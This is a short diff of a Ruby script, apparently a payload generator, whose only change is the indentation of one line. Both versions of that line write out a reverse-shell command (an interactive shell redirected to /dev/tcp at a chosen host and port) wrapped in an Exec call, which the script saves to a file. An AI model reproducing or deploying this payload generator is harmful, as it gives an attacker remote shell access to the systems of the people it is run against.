@@ -59,7 +59,7 @@ begin
     sleep(0.5)
     open(file, 'w') { |f|
         f.puts "begin"
-	      f.puts "    Exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+	f.puts "    Exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
         f.puts "end."
     }
     puts "#{s}Saved to #{file}!"
